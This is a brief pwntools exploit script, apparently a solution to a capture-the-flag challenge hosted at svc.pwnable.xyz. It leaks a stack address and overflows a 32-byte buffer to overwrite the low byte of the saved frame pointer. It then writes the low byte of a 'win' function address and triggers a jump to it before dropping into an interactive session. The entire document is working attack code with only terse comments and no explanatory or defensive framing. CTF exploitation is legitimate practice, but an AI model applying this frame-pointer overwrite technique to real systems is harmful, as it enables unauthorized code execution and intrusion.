from pwn import *

p = remote('svc.pwnable.xyz', 30012)
rbp_offset = 248

p.sendafter(b'>', b'3')
env_addr = int(p.recvline().strip(), base=16)
rbp_addr = env_addr - rbp_offset
rbp_byte = rbp_addr & 0xff
win_byte = 0x0010b77 & 0xff

p.sendafter(b'>', b'A' * 32 + p8(rbp_byte + 9)) # Change rbp
p.sendafter(b'>', str(win_byte).encode()) # Write address to jump
p.sendafter(b'>', b'A' * 32 + p8(rbp_byte)) # Revert rbp
p.sendafter(b'>', b'1') # Jump

p.interactive()
